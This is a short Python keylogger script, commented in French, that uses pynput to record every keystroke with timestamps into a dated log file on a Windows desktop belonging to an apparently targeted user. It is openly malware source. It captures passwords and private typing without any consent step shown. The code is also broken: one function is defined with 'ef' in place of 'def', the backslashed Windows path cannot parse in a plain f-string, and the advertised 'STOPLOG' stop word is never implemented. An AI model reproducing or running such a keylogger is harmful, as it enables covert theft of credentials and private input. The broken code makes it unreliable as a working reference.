from pynput.keyboard import Listener, Key
import logging
from datetime import datetime

# Création du fichier de logs contenant les frappes

log_filename = f"C:\Users\Formateur Cible\Desktop\keylog_{datetime.now().strftime('%Y-%m-%d')}.txt"

logging.basicConfig(
    filename=log_filename,
    level=logging.INFO,
    format="%(asctime)s: %(message)s"
)

logging.info("Démarrage du script")

buffer = ""  # Stocke les dernières frappes pour le mot-clé d'arrêt

ef on_press(key):
    global buffer
    try:
        # Capture des lettres et chiffres
        touche = key.char
        buffer += touche
        logging.info(touche)
    except AttributeError:
        try:
            # Gestion des touches spéciales
            if key == Key.space:
                buffer += " "
                logging.info(" [ESPACE] ")
            elif key == Key.enter:
                buffer += "\n"
                logging.info(" [ENTREE] ")
            elif key == Key.tab:
                buffer += "\t"
                logging.info(" [TABULATION] ")
            elif key == Key.backspace:
                buffer = buffer[:-1]
                logging.info(" [SUPPR] ")
            else:
                logging.info(f" [{key}] ")
        except Exception as e:
            print(f"Erreur lors du traitement de la touche : {e}")

def on_release(key):
    # Arrêt si touche Échap
    if key == Key.esc:
        print("Touche Échap pressée. Keylogger arrêté.")
        return False

# Lancement du listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger lancé. Appuyez sur Échap ou tapez 'STOPLOG' pour arrêter.")
    listener.join()
